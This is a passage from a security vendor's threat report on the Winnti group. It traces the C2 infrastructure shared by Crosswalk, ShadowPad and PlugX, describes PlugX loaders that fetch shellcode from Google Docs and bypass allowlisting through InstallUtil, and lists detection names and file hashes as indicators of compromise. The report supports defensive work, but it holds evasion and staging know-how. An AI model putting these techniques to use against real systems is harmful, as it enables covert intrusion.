They include the likely data of module assembly (June 6, 2020), name of the service used by the malware to gain persistence on the system (WMNetworkSvc), names of processes into which shellcode can be injected, and the C2 domain cigy2jft92.kasprsky[.]info.
As we wrote earlier, the other domain kasprsky[.]info has been used by attackers as a FunnySwitch C2 server. Investigation of subdomains and IP addresses yields another second-level domain, livehost[.]live, whose subdomain d89o0gm35t.livehost[.]live is indicated as a C2 server in one copy of Crosswalk (86100e3efa14a6805a33b2ed24234ac73e094c84cf4282426192607fb8810961). Moreover, all samples of these backdoors were signed with the stolen Zealot Digital certificate and were likely used together as part of a single campaign.
This is not the only example of a connection between the Crosswalk and ShadowPad network infrastructures. Two Crosswalk C2 servers we found, 103.248.21[.]134 and 103.248.21[.]179, contained an SSL certificate with SHA-1 value of b1d749a8883ac9860c45986e2ffe370feb3d9ab6. The same certificate was noted at IP address 103.4.29[.]167, which via the domain update.ilastname[.]com was used as a C2 server for another copy of ShadowPad (37be65842e3fc72a5ceccdc3d7784a96d3ca6c693d84ed99501f303637f9301a).


Figure 54. Fragment of ShadowPad and PlugX infrastructure

7. PlugX
The SSL certificate pointed us to another C2 server, with the domain ns.mircosoftbox[.]com.
We found that this C2 server is used by an interesting copy of the PlugX backdoor. Its core is typical of PlugX, being an SFX archive (ccdb8e0162796efe19128c0bac78478fd1ff2dc3382aed0c19b0f4bd99a31efc) that contains the library mapistub.dll, which loads as a legitimate executable.


Figure 55. PlugX SFX archive

But mapistub.dll is only a downloader. Google Docs is used to store the payload: the library sends a request to export a certain document in .txt format, decodes it into shellcode with Base64, and runs it.


Figure 56. Loading and running shellcode in mapistub.dll

The shellcode has been obfuscated with junk instructions and inverted conditional jumps (combinations of jle/jg and the like). Its job is to decrypt and run the next stage, which is responsible for reflective loading of the main PlugX component and passing the structure with the configuration to it.


Figure 57. Obfuscated shellcode from Google Docs

This process and what the similar sample does after that are described in more detail in a report from Dr.Web (QuickHeal shellcode and BackDoor.PlugX.28).
Besides the C2 servers in the configuration file, 103.79.76[.]205 and ns.mircosoftbox[.]com, in our case the attackers also used a technique typical of PlugX for getting a C2 server at a specified URL. The C2 address is encoded in the page body between the DZKS and DZJS markers.
Again, the address of a Google Docs document is used as the URL.


Figure 58. Document with encoded URL

Note that the document is editable without logging in. But when we accessed it for the first time, it had the IP address 107.174.45[.]134, which is related to the domain dc-d68d34331440.mircosoftbox[.]com and, apparently, had been put in place by the attackers.
A similar technique has been used by Winnti in the past: according to Trend Micro, an encoded C2 address was stored in GitHub repositories in 2017.
7.1 Paranoid PlugX
We were able to detect an additional copy of PlugX that contained shellcode fully identical to that downloaded from Google Docs, except for the encrypted configuration.
It, too, is an SFX archive (94ea23e7f53cb9111dd61fe1a1cbb79b8bbabd2d37ed6bfa67ba2a437cfd5e92) but with different files inside.


Figure 59. Contents of the SFX archive

When unpacked, the archive runs the script 1.vbs, which in turn passes control to a.bat.


Figure 60. Contents of a.bat

The main payload is in the file image.jpg, which is actually a specially crafted .NET assembly. The assembly launches with the help of InstallUtil.exe from .NET Framework, enabling it to bypass application allowlist restrictions.


Figure 61. Running shellcode in image.jpg

The purpose of image.jpg is to run the same PlugX shellcode with the help of CreateThread.
Its configuration contains two C2 servers: update.upgradsource[.]com and ns.upgradsource[.]com.
The domain upgradsource[.]com is mentioned in a Unit42 report on a group of similar samples named "Paranoid PlugX." They received this name due to the presence of a script for wiping traces of malware from the system. Comparing the sample we found to those described in that report, we conclude with strong confidence that it belongs to the same group. Among other reasons, the structure of the .NET Wrapper module in image.jpg, and much of the cleanup script a.bat, is nearly identical.
According to Unit42, the main targets of Paranoid PlugX attacks were gaming companies—which are known to be a typical area of interest for Winnti. Investigation of the network infrastructure provides yet another piece of confirmation of the relationship between Paranoid PlugX and Winnti.
As of late 2017, update.upgradsource[.]com resolved to the IP address 121.170.185[.]183. Later, update.byeserver[.]com and update.serverbye[.]com resolved to this address as well. The second-level domains byeserver[.]com and serverbye[.]com, in turn, are listed by FireEye in its report on APT41.
8. Conclusion
Winnti has an extensive arsenal of malware, as can be seen from the group's attacks. Winnti uses both widely available tools (Metasploit, Cobalt Strike, PlugX) and custom-developed ones, which are constantly increasing in number. By May 2020, the group had started to use its new backdoor, FunnySwitch, which possess unusual message relay functionality.
One distinguishing trait of the group's backdoors is support for multiple transport protocols for connecting to C2 servers, which complicates efforts to detect malicious traffic. Malicious files of varying resemblance are used to install the payload, from primitive RAR and SFX-RAR files to reuse of malware from other groups and multistage threats with vulnerability exploits and non-trivial shellcode loaders. But the payload may be one and the same in all these cases. Most likely, the choice is dictated by the precision (or lack thereof) of an attack: unique infection chains and highly attractive bait are held back for targeted attacks.
Winnti continues to pursue game developers and publishers in Russia and elsewhere. Small studios tend to neglect information security, making them a tempting target. Attacks on software developers are especially dangerous for the risk they pose to end users, as already happened in the well-known cases of CCleaner and ASUS. By ensuring timely detection and investigation of breaches, companies can avoid becoming victims of such a scenario.
9. PT products detection names
9.1 PT Sandbox

Trojan-Dropper.Win32.Higaisa.a
Backdoor.Win32.CobaltStrike.a
Trojan-Dropper.Win32.Winnti.a
Trojan-Dropper.Win32.Winnti.b
Trojan-Dropper.Win32.Shadowpad.a
Backdoor.Win32.Shadowpad.c
Backdoor.Win32.FunnySwitch.a

9.2 PT Network Attack Discovery

REMOTE [PTsecurity] Crosswalk
sid: 10006001;10006002;10006003;10006004;
SHELL [PTsecurity] Metasploit/Meterpreter
sid: 10003751;10003753;10003754;10003755;10006172;10002588;
REMOTE [PTsecurity] Cobalt Strike Beacon Observed
sid: 10000748;10005757;
REMOTE [PTsecurity] Cobalt Strike (jquery profile)
sid:10005754;
REMOTE [PTsecurity] FunnySwitch
sid: 11004815;1004814;11004813;11004812;
SPYWARE [PTsecurity] ShadowPad
sid: 10005851;10005852;10005854;
REMOTE [PTsecurity] PlugX
sid: 10001390;10001391;10002946;10004422;10004426;10004472;10004473;10004515;10004532;10005968;

10. Applications
10.1 Known names of files from which PL shellcode may be loaded
C_99401.NLS
DriverStatics.ax
DrtmAuth005.bin
DrtmAuth13.bin
FINTCACHE.DAT
SEService.dat
Theme.re
WspTst.xsl
cbdhsvcs.bin
chrome_proxy.dll
config.ini
localsvc.ax
log.txt
msdsm.tlb
normnfa.nls
normnfw.nls
services.bin
soundsvc.sys
storesync.dat
storesyncsvc.ini
svchosl.bin
svchost.bin
wbemcomn64.sys
wbemcomna.dat
winness.exe.config
winupdate.txt
10.2 IOCs
File indicators
LNK file attacks




1074654a3f3df73f6e0fd0ad81597c662b75c273c92dc75c5a6bea81f093ef81
9b638f77634f535e52527d43ad850133788bfb0c
c657e04141252e39b9fa75489f6320f5


0deb252a5048c3371358618750813e947458c77e651c729b9d51363f3d16b583
f50b624ba6eb9d3947f22cf7f95a6f70b7c463d3
a140420e12b68c872fe687967ac5ddbe


8e6945ae06dd849b9db0c2983bca82de1dddbf79afb371aa88da71c19c44c996
5b8e644acc097f7123172d96a3a45bd398661064
93ffd591948223e806c248861735e006


c0a0266f6df7f1235aeb4aad554e505320560967248c9c5cce7409fc77b56bd5
d500cec0ce5358751f3371b69a4a9bc402df8af4
45278d4ad4e0f4a891ec99283df153c3


bcfff6c0d72a8041a37fe3cc5c0233ac4ef8c3b7c3c6bca70d2fcfaed4c5325e
1a33f41d054a2ed2d395b19852583daddd056bb4
177e37ec8d07d6954b2102760c74708a


35a1ff5b9ad3f46222861818e3bb8a2323e20605d15d4fe395e1d16f48189530
0a462e8e3b153e249507b1652d9f6180463e7027
17548fb49ef598901ab83b7c630fbe9a


beaa2c8dcf9fbf70358a8cf71b2acee95146dba79ba37943a939a2145b83b32e
acf5f997a16937072a2a72f1ba7704f9703ea27c
e5809996b6126a5573623a9010eb4ee2


dca8fcb7879cf4718de0ee61a88425fca9dfa9883be187bae3534076f835a54d
db6333f84538a21466e5ffe3c7102e0543cec167
d53daa634260ed28fc2e8610ecf15ad3


4733d1204b06dc95178e83834af61934a423534e1d4edd402b37e226f0f2727f
dba010496a7be2e5de1f923ffdfc19bf345b650b
9776f04d9c254a0b67f4dc000369a17c


dcd2531aa89a99f009a740eab43d2aa2b8c1ed7c8d7e755405039f3a235e23a6
281c1b196cd992906d8583e64011dc28d9c52e3c
4a4a223893c67b9d34392670002d58d7


d4df4b58ee241e276ea03235445c04d1a28e48ec8b6e2599a56f6c4b8af3269b
7b6b01e9f726ab0b5f94cd68687d4787008cd7f5
4dcd2e0287e0292a1ad71cbfdf99726e


d064f675765f54ee80392fcfb5d136cd2407d06d0ea8cd7d8632d1a2b24c0439
8b8b1219581555f2d9747b289d57c3e0e274fd07
260eae2912475e51d82534b467e5746b


32705d3d9f7058e688b471e896dce505b3c6543218be28bbac85f6abbc09b791
289b5017f5ee8c915f755b1c7eefffbfb3d2d799
28bfed8776c0787e9da3a2004c12b09a


c613487a5fc65b3b4ca855980e33dd327b3f37a61ce0809518ba98b454ebf68b
0f1f2431ecccb980f7d93b9af52139d0d508510f
997ab0b59d865c4bd63cc55b5e9c8b48


4e5e3762c850536aac6add3a5ac66f54cbd15c37bd8fc72d3ade9dd5e17f420b
21a5bcd916bc61585cfe1d5656240237e24157b9
07254dbd369ba10a1f28ae707ba72dcf


2d182910dade1237f1dd398d1e7af0d6eca3a74a6614089a3af671486420fb2b
0261490fb7f88cc3e9db6aa3fd185d03d7646864
f6886709564630fbb48121d0ccc7c0a6




Shellcode injectors
Payload: Crosswalk




0046df35f66a3b076d9206412be2f1f7ea4641d96574e7b58578c0c0995d1feb
b73fcfc423d1bdb4649440689ff4894639b3bd0e
9697d60b744a14b3003559d17cfc2f8f


325430384d642ab2a902fb0e268e85808b6cbf87506ccdc314e116e7d1b8239e
0f2a5bbe03c5b3422609b78ca90fb7f06bfd966b
eee464e5ded3f4e37d49c8a91b1eb157


9e27f110fc824d8b85855538c3320e8ea436e82737d686fcecb512b6f872e172
4481c4b0cf2207099c7b5979a6e81a2923d6c698
254ace03b179c6565ac2616dd4d24f85


bec68bcaa80bb00274ef7066ddc8de1b289fb5f8b8e8573f3a961664f41da9d7
cc24843afd627ced74a1d713328078a23db81e54
914151fa49be06ab570bb0db77ce6960


3454d87b2ce0eab44c07774c7b56318710f9a63626d6d2aaf898922178bf2792
e6cd7a9f5b421b80b50e5809c35732c427c6b6d8
fbfeecea5a8c752c9bffdf6b9f7fcf50


1e29e07b404836c82cd9b75e44a3169195a335dc494ba27f744f6605666c26aa
a1e0ce3c384945fdde841d91d069505879587217
d19c5c55733244f4a8d5a1af4e6c1250


3a9bbf4ee872904e729466aa50d570b43451b0945a41b5d9d114f8c24683c21e
5d1bada317d596f3dec5b86e4e42639b2f5f71ac
6d967f275beb3855980a80d60ef8023c


faca607b43551044fda3c799ce7e9ce61004100544eeb196734972303f57f2ae
159a5ca55d7c62d0167740f8f5310e18e03a8fd3
4518f25c6307ef6d2ea5c0e66f2b16d1


86100e3efa14a6805a33b2ed24234ac73e094c84cf4282426192607fb8810961
604c5f42eeb015016b35ec1c9019812afc400f5b
7078450715c103056b01ad87787aaed6




Payload: Metasploit




0ad8ee3fe6d45626b28c0051c4c4f83358a03096ad06fc7135621293e95c75ae
e8fcd7ca491bffc4838bf9eb6a7aec3f7e4acdc2
a752d48a4433eb2dd56c8946a345ac9e


75d573d1e788590195012a1965cfcaa911c566aee88331b7718ddc638028c175
ca66a779a5b720e5f73e91561bd3434db691e13b
2867ca5c273fbb128504a4e455e862a4


8c962ddbb515e73ecfc5df9db35a54c8c9d15713a04425298f2d89308e2a47bf
ce1cb0050662e541e72a24c6a969fa7b51084a60
2555677876b50a03e42420838c1997f1


fb23c7fc2e5e8ae33942734c453961da9ed4659368d19180a8f1ecb3b9b8e853
d03a5b322f3748c9019ca24dd1943507d591165e
9a026082cb80cdba1a68ae1d14f79b9d


012d8d787c6e7a5f3dbe1e9cce7c5da166537a819221e210ef4d108f1a0a24b3
d913285f75a3a1a4f2a6e0f66bfda8efc71fc669
d8ff9eb5582371745ffe1636a89f97ce


420dc77afe28003f14dfe6c09fbf8194ead8a6e8222b6ab126e7ee9bf4b63fd4
ebafff5ff0517ea5c2c783ab7d0cffded468bf4f
c024b658471a27ec5201f96f65f0b89a


a02258fcb3694893b900f10f0f9bb1d0d522ed098b1cc8eab59f2f70209b3a0b
9bdd1af6fc74a8a3c2ff0e3bf1378ff290cdb35e
bb4155a5add9446b6354d46a78edc8d5


f54cf6d9a5d77a89c4a2d47b02736d746764319e02ad224019db8de78842334a
8413380c19f348ef08051b2d6d8b39598bb05f68
cdddd08982ca2dd76a63cbf603956f1a




Self-contained PL shellcode loaders
Payload: Crosswalk




5841a4302fcbd63f66fc2afd41f8671744454aaa7e1ed834e935bfdb007a9a83
3d0b40b2a6fc691f702237ba5682335e7e74e649
a8bb1d69fb8a9d323bbc5d78f0e62850


e0b675302efc8c94e94b400a67bc627889bfdebb4f4dffdd68fdbc61d4cd03ae
4db6e492a9ef89e116f4da19f97d69cb82e08661
2dc960eb4691a148ece5ee2b24932f03


e398290469966aff01a9e138d45c4655790d7a641950e675785d0a2ab93e7d28
1e494e1cf8df105d95d0e0bb4879223030c48a0c
42a5908ff9b65d3b1a1a9f52ca6f06a5


8add31b6a2828e0d0a5b3ac225f6063f2c67c56036ff3f5099a9ee446459012a
5c11f70345d984391d041b604adfe5bfb5134755
5e3ef894b490d1c931a5f70d44789316


a4b2a737badef32831cbf05bfaa65b5121ddb41463177f4ac0dbc354b3b451d4
8c549d16dc97072f16e4a3114fbd7d47f8bc9726
1bc1df4b946e83f26c878f01145545a4


2fdef9d8896705f468f66eb8c20e5892d161c1d98ab5962aa231326546e25056
7b465b1e0d7be4d84e06a115fd55b97207de768c
221db0f664ea781b4dff81e0a354c63d




Payload: Metasploit




a7df8143a36638de40233b141919d767678b45bf5467e948a637eaafb2820550
be39c3022218ccb3abcfc6c906359b76571f4241
dc758b9ecca41f7f66808258efbfc6cf


283302c43466bdc6524a1e58a0ff9cc223ab8f540a1b0248d1fcffe81b87d5d6
b2bb31ea3b4abaf3f3edbff405e23f2ce442dfe0
3839d37a6a7a29a7af79f102e28b8bc2


b447a7bb633f682058d4b9df5caabbe8c794f087b80bf598d6741a255e925078
3c523a969cc4c273ae27fef32630701516b08873
63584677683b5fbf4f69053a8de9ecbe


01c8cc07a83ffd7ac9ee008685eb360c9934919e86847c50c8843807b9d9c196
37ec3d5be7b535a8a31001815ab275a489e302f5
d92db6b734b1db3874396506613a4962


21dd261e5fe46b86833cd69b299ae5ee5f24da3d4e87de509eddda4d2f63d591
11e86ee44e7c3592c97f7191746e170b62f724bb
c8f1aff87d12e0e5c7082b8a565c4abb




Payload: Cobalt Strike BEACON




ba03feb351825029426e84c2f74e314f27b56714a082759650a455dfb1a946eb
8890155c88c690faaf900d1e63998756809273d0
cbccba5f774642c80aacfed20d20435b


06210a1f9bc48128e050df0884f9759e4d202bd103aa78e6b6eb3cec1a58cdb5
a0128edc037a91ce127291edd9d950e7661dd764
64071aaa193ab18722553bf6f573547b


0d6a5183b903b1013367b9a319f21a7a3b7798d9565a0deee52951f62a708227
2d35c342d8fc6f5d018937491e246da2ab293d43
b8b43c4c4207b180ec8be82ff066172a


1bd0f0fbd7df99c41e057f6d6c7107812ef1370609ad215a92227ca79ce6df70
7dcb0d7300aa54ef77eb3347e6204b31d4b9c6db
4922247f9b83341987e0b4e80f5c153f


29233eab65960c2da4962e343a3adab768673012d074db35ebc2abe2142ee73c
1d3dc9bb7acfe8416ac5ab51f24b6648b91eb305
cb682ec885f353bcc51ac350bc015783


79fbb45d0041933dce16325b87b969db12b7a8dedc918929615104835badc80f
b13d58f1d24cf5e10a7013f4aeac22e974c74315
407990337eac6582533df5c85528817a


8f0538a18c944e2a98f1415d5528a0dab4367cd8689f598ab2da266c36403252
483c49349d29e11e0d195864e372a210ce5ce856
7e8ebe133a530ea86f179c87fc8e51f7


025e053e329f7e5e930cc5aa8492a76e6bc61d5769aa614ec66088943bf77596
e63646f0089ce3a224d68029eecff72ef0259609
f9fa912e498f20c440dde32fc8a66608


d30dd7d82059dc34e72c3131dd7ea87f427cabe7225bbf59aa69e01cd761a1fe
8be2fccba22fdca0e453855c7428e709186f3e0d
c839ae523f04e7859498de1dee570867


81ab37ae3abce3feabdefde6a008dec322e0168ce4f0456ee737135025399400
98d6dffb7e51170a02546eeb07c80f2592d10293
5ed49962d13dcd6e0eab98f966273fca


b55812f35735e4fb601575072f1b314508b2dafdcb65aa6c1245a2e1f9d80bdd
6986b924c58aa90a9e413d9942c25a1419d9aa0e
f88416bc9ffcb639f1357ebafe3ae9a7


fc5c9c93781fbbac25d185ec8f920170503ec1eddfc623d2285a05d05d5552dc
0902e3c41fb8e0dffc322e6a562f04588b7522a3
6817b7a5d1542eff1cc404a44a31353a


d879b6cac6026a5418df4bf15296890507dbaec5abe56dafda54266975488cf2
11c987cdafec8ea02a77a03d4c979f743138b39a
b02057f05f57f3a889a744533001cf7d


6e7052562db5f23c2740e9d094aae2316f77866b366eb4ef59c157e112172206
7fd0d64f54a54aabd04136e4111e2d8a22884324
dda83ca52a9d9dbdc7752db8ed9533a9


9afb78e9be08041f849563c4fd2777a373ffc76c3eccd638b1f6f846b847b968
2b47e9c8946536decba6066f9a57a85f143465c5
482d1c1e2044b0b4d1641f15d82e86b6


8b515bf88b3f7ac77861fdea61f82fb0c941bc5569922cadca254a79a744ae99
e46490394ddc66548067ba540d13fb3cf363c596
2a189598113d436e4b717abb76f1c652


f91f2a7e1944734371562f18b066f193605e07223aab90bd1e8925e23bbeaa1c
0b83939510bd31939c91370c53fab25aa286ba08
5909983db4d9023e4098e56361c96a6f


3d38dfd588fc98de099201fe9f52feb29bb401fc623d6fe03eb8f0c959ffc731
af76d1d293e3e8fe7ad428ca6fe47e68c858587b
284dcb880e68d66cb890ef85d78ea7ae


6a10027dd99f124cd9d2682b6e7b0841d070607ea22a446f3c40c0b9f9725bed
f2751dbfe822907ecb69b83e461b48183a485355
0d69dae8f83f09b8671b8552a0acd319


71a965d54c4b60f7ae4a5e46394bfca013d06e888ec64f06d5ec3d8a21eccb55
4b51a8233991d4255fc05d9bbfc242f779b1d31d
5e61778a1e660691dce99ebb8e5e257c


5347c5bbfaec8877c3b909ff80cda82f505c3ef6384a9ecf040c821fc7829736
1530993376416274d04907ff6369a3012694bfa9
62d6fb0f33d0411ea6abd3167118a0e1


de648c21b4fae290855fdf0cd63d9e6807ced0577bdcf5ff50147ba44bf30251
3a0c2aee518b7c003e5eb8aa7094d536b8bf1a94
dbd6a052331365a31f74e2c41d5cd132


7ed5cbeb6c732aa492762381033ff06d0c29f1c731530d4d27704822141a074a
2d0bb1fc0213e4fca5c3b485caaf964dd2da7981
05e1247ff02d50aed81ecd9d0b93c41c


e886caba3fea000a7de8948c4de0f9b5857f0baef6cf905a2c53641dbbc0277c
6b92e6d594fd6e26f9e910f10f388c43017303b2
48bda0c5e53b6d7ee7fb1da6130f325f




External PL shellcode loaders




0041b28d1f076e196af761a536aa800ebe2fcaea9084a8e17d2a43c43765efdd
0cb8ed29268ec9848ff1c7f25f28b620271e61c9
131711477620098191777f93c580ee6c


0756216ea3fea5b394e2fa86e90a75f05c3da2b4b47d61110559bd28f51da8e6
7a1c5e1799bdeebb01527f54a7fd89d0b720dea7
53e2c1eb6b87e92b5f534503f011f6ee


34aeaa89aab983318ed8f6da32556faf3057a92dc045fac1f960f3aaad3a1ba1
a42e6dc7f248794e91e4ec251c2c96164215b7be
f02a87562ffdd7a1c941dac4175854b0


40101054d18eb50b65c2ce32b00352d2486008f67c63baec5ef93cac9d5c81ed
11d7145b85fea84aed35c60857560a66dbff5a27
e5271b41cf32892cc16445ac0783f3f7


4665280d4b34c5388edeb51a6d5e808d2942c364017a42d3f1fac186b21eb571
09a3fb96edbd5e143ba3b579cb2c09d0dd9469eb
da220930ac3e45a713d9da2e6c1c246a


46f03ddf74c47960a3731de18f123b2110153ed668f9bf6ed3badd7fd099ccb6
90c104dadb5c21b4fca644b37f7043fef7e72d2b
71b250a873a070415fed172759a42b7d


4f2d8c437d32dc075074f01d10698f6d4dfc4d4bd8a595dabaa2519c6a025c8e
e629fda195636d99ac587b354b5c6fc228d65d81
8b2e72f2b13c63a583ae9a9cd474adf6


655c21fc31967282d8517b3c845f775cd0a80595f90c5c85b6027110532a1cf9
5fa5593b52cfc866c51f55e9a56b1adcc9db01d1
318b3661ec5929f069e7821fac537fe0


8f8ee8d2bc6c559a0a09ce3958727dee2f30880c615b2788d757917ca55d43ef
b769c9c708f59be0a0d68ddf3076c9d9037b6c27
1d6def7a4bed4a8772e3cae6926d405b


8fb8134bf40ad6bddd60ea77b78c30dab72c736bf29172f89d03505b80c3ae8d
9a17591711383d96f7cc421a71d5d394e322189a
7af8c2055a608c920ba5e5c63fd43207


9bf32bf4a4bc1d13bddaa6402595ad76d2d9fcc91a988313f13ed990ccb1c4c1
68ae7f3d2cb22c70232a35ed59f6fed70fe0f3be
fb2ac5049bdee8dd1753fa7e9d007e6b


9c3280bc1ebc239de86523a7046b45e9bb7ce7a40a869dda6ea92fcee727366a
cf90d0b4ac09dc97f675fb3cfbc8eba89db211e8
bb6b9a60c3b4062669bac3608ca7b0c1


bfe2673b02c54be9093cff8fd564b630109175c608f07d94e4a2ac65028a6eae
59c4f47b1135f21a8814c8a838277f4cfa46f2e5
fcceb7a3bc3b0c48c8d9c91eb0b896ab


c93999f7622caf63cbcfb26966ff11719a4e26bca7d90a843461f44a3c982a30
0a8fbc71a936d2e7f2830fae3d57a2f1e8e43266
36fe1e0db5e74ed3e6adc039720c54d6


d0686f44fb7e77ce0f68cc91c4cef12dbd691bb99b0b7be77103b7b17eec3753
0b09ac7691cb9b8b7b5a2e453984bc75edbc8aeb
b5605f71d18cc255dbbd910ac008ae6e


d6a05e20da5012c0cfc491b0044f7fded9322f5bbc664092c4b481709c3472e0
735e97688a70d24d922cf9a3951c5e23a91cbcb1
4a89eb933fa87d85542488df6ae20d82


e7f5a30d4bf7915cc97374e0f6a29573d4640961166b5c9b942030e8c10949d8
c224763846f8f61442e893cb8e9070ce67be5dc8
63c1b74c829ee362730ff37d6101d276


e935699b31707ecf9e006940f31f09514688cb45e078a66724603ee7fadf84db
5ba9f7cd51e8eac88f870e340c8262683d92563d
99b86e64d76d21b2a5bfeb48b89e3935


f36a0b99973a837d5e4d542edd739df7cac10e207be538d47a106c4edf7cff54
fde9357e8d6a3336dbd82d2e22dbc0772640f63f
0133bd3f26788732a580115218d98273


f69c6e8fe1188a461bfe249ba7afefbd7a787fcd0777c008f9580f6976118898
d3d4c7cf257f9fe97bdf31a4b0e3f66726fb1b6f
3d09dee9bc20abf33b64bcb4c6d3130f


fad80dc36a59d1cc67f3c4f5deb2650ca7f5abac43858bf38b46f60d6bb4b196
119b92462a91f9cc8b24dfbd84fb88ef47ecab97
247c48b8758a9eba48bfe39c53ff9e6e


0187d3fae2dfc1629e766d5df38bdabf5effcb4746befceb1aaf283e9fe063a1
648594c25aebf3865c35ce6057e36b42e9e3be31
dbc30db0ed5ba1ea3b2e500823448c6c


45d175f3c1cb6067f60ea90661524124102f872830a78968f46187d6bc28f70d
418fab494383e2ae0d94900344853cc0bc6d5385
337171764c99b7ae87c030e11cda00c6


ca0f235b67506ed5882fe4b520fd007f59c0970a115a61105a560b502745ac6a
1c265ed6b5875a619a427db1663f48fe7db01d88
2a3e63fdbcbbad9b4be8b35a180ea0d4


abac7a72b425ff38f8a7d8b66178da519525dc2137ca8904b42301fb46a8983e
d9b692d84bdc134f90b54ac2a30f6832d70e730b
211db7515faa09aa0623b327bd1530f1


645b14df1bd5e294ec194784bc2bd13e0b65dac33897c9b63ad9ed35ec6df3a8
6d3643bfdd1bd85cfdfe4b05eaf2939bbf4b22f0
359f5615dcf2f75bc74146afad630427


6b4b9cf828f419298cd7fda95db28c53fc53627124224d87d2ad060185767957
59208d32dd7440bbe4142882b8ad1ac033f08918
bae0fc6f570ca12a9b2980dd00bc673c


7fd19347519ec15ab8dbce66722b28a917b87ad034282ef90851e1b994463644
c4467556640ad45fb8e56d1fb95c93e57b209924
086186c935a68e7167113da46a17fa80


8308e54055b45eb63dc6c4c6a4112310a45dec041c1be7deb55bec548617136f
c44934f47c98c7cde7ba5978ca315a5e9099d0c8
cf13bdefb622fc90dcda39e20e45d636


adf52650ce698e17d5ff130bc975a82b47c6c175ad929083d757ec0fe7c4b205
bed84d4ef7bd8c5fb683eab51d849c891328b4d4
08393f7d6e0ee2b7472173f4419a602d


fb707094673a48408f9ba5240019cb502b9367fb380bb1734e0243e90b9399c3
e452227d134fe14df3ca35cd2abf7f1e922aa5d6
d761c07911138e605723f891965035b8


4da733bbf7d585ee5b5a58c0ad77047ce640a4512a84502ad5ae9240ee2fcdb0
ff362a3d5d873f8fd0f7c2f150582dab9251cf2c
5eab890242e8b811865e1bd3a7fd7868


bef3f87c6582813e23b0c8c8db9ca9ed65bc802445187378f4e62a7246133ae2
27e4115041c059dce22322e0242002353ab14814
6d33db967323d822ba3239dcdfcb555c


b83534071bbcacc175449faadbb1d6b0852fe58521da0fefd5398a4a9b1fb884
26ca2262f31dcc1fd6ad56f1f371a363163ba7f2
d12013fb90a60869cfdaaffe1a18467d


adf52650ce698e17d5ff130bc975a82b47c6c175ad929083d757ec0fe7c4b205
bed84d4ef7bd8c5fb683eab51d849c891328b4d4
08393f7d6e0ee2b7472173f4419a602d


e4df8634f5f231fae264684e63b3e0c6497b98dd24ba1b0c6f85c156d33a079c
e3e7b719fa1bb3fd12bb82592f85c3e4c3b1d7fa
03275b5b1f9d11b1731d5746827d00b1


afb5e3f05d2eedf6e0e7447a34ce6fd135a72dad11660cf21bec4178d0edc15b
c67ad0bb292ed20dbe9ba980e71d223249632252
38857fb40e0655495df270777043b813


1968f29b67920fc59e54eba7852a32f20ecbf3f09481c09ddbee1dedc37f296e
b49679280a2c5b01d0126fc835cc29e4fdc5900d
468c5c3f46299c67366727a58e3322e4


be70b599e8d7272e8debf49e6bf6e5d8d9f1965812f387a9f1e75aa34788a7c7
88282f8c93d61fd0caaec8807448e96f90101901
db394163c7e6e511d0e4046ff34d67e2




PL shellcode: Metasploit




f6085075e906a93a9696d9911577d16e2b5a92bc6b7c514d62992c14d5999205
4a0b8e9a56876c11c667b9ce77b371d2c6d07891
8849cf257c383044c006beb8e66d3add




PL shellcode: Cobalt Strike Beacon




43fe07f9adeb32b20e21048e9bb41d01e6b3559d98088ac8cd8ab0fad766b885
30dee2118fc28bb0b2804275c92daf58236824e5
2a2a50ec29f741faecbff0bcf705da0a


6867f3d853de5dfe8adbd761576c29ad853611d8d1c7fdd15b07125fd05321f8
7420afe3c0c91442fac0c6df5dd1cfedd76503de
69b9d1fc0edb0a67909847e43ac79ccf


0c6c6ba92661c119168a5486faa1af94673bd4d770c13c2b49d7a0651f798857
cb552c22718ca9eaf16792c1ecc583c09f1f19e1
b67ff211420c9f5647df2de02e771864


be7ba33fcb2a19bb2d1fe746f49c39fb1b8bd5d9e46d5b6610f8a2ad3f60b248
7849dcf58fbb930a1327635e13e9970d4bdc7121
9a478e85f1aed628e3fc1f7c8fdeae82


d1a548b9ad6b4468ee3c5f6e1aaaa515021255fb13e45ff34fbff5ad88bf4de2
93404b4005e7ab0e8c9282ced20c16820378792b
eff6e2a93e60fe017e9f082cd6d3fac9


9ad808caa0b6a60a584566f3c172280617e36699326e7425356795b221af41dc
f3093ae9f6633449c1d4f35804d1166dcbe09ece
abb6e606a5fd22abfaefb1dbf970ce2f


eb9c850b1e8d8842eb900fa78135b518fb69da49c72304b5b3b4b6f4fa639e57
6c34f4f29cb3d8cc8f55a707d255de50caa67e8f
b80d303171db4adb554e656aaba15fc9


e10046b86fe821d8208cb0a6824080ea6cd47a92d4f6e22ce7f5c4c0d9605e4b
1cc16e3a6185b790875e3f00b68ec87feddcf93f
cd43240098f60c5d65290ef93ebdf6de


a783edae435c6fdf55e937b3246b454ed3b85583184b6ffc1b2faba75c9165cf
aed326228551a4736012c1921d3be7079541c29e
07377cf8abcabcf4ec87e9dde67672d6




CHM file attack




b6685eb069bdfeec54c9ac349b6f26fb8ecf7a27f8dfd8fcdb09983c94aed869
db190af369fdc654af39a54c44f37d5e5712fda8
06f945c39870743d51ca887efb32d649


5d549155b1a5a9c49497cf34ca0d6d4ca19c06c9996464386fc0ed696bf355a2
7dabbd292f8bb8b600439a9c1b2fa69eeecbcb88
46d3773e0e306b8a1ede7932b83fb034


02f5cb58a57d807c365edf8df5635263f428b099a38dff7fe7f4436b84efbe71
9c921a278ba4647269b45a5716b47ee47b6de24f
e8c21f8f50bc5720b1713322db4a9022


3c8049bd7d2c285acc0685d55b73e4339d4d0a755acffad697d5a6806d95bb28
201eac040aa2693042efa7539a88e2676dcf89af
e93bdab9e64bcce94f70a91e0ee115da


fcbd7ab82939b7e0aff38f48a1797ac2efdb3c01c326a2dcf828a500015e0e83
8a503147831499778b2d50f8337677c249c99846
21aa8aa3a92ebca1963595a328061843


3c6d304c050607a9b945b9c7e80805fc5d54ced16f3d27aaa42fce6434c92472
1e75cfd3db2cc4b0091e271a7533b828632f399c
951c5f08eef4ef8acc3352a44c7c0e80


4d3ad3ff281a144d9a0a8ae5680f13e201ce1a6ba70e53a74510f0e41ae6a9e6
9c1d4db37c2d72ac9761dd342feb8a31bc636d6d
b22b232381ea465aeb81fb7077141d06




FunnySwitch




23dfce597a6afef4a1fffd0e7cf89eba31f964f3eabcec1545317efeb25082ed
6dd15c03ffd3762a20b0f51faf31724d5dbf1466
2b0c692d9eafed5e24f2b52234ea0fa2


2063fae36db936de23eb728bcf3f8a5572f83645786c2a0a5529c71d8447a9af
c1e31f72adba9d5e2801e6766a24eb8d37807e9d
7e1948326ff96a1b6f8e8d6dee152e28


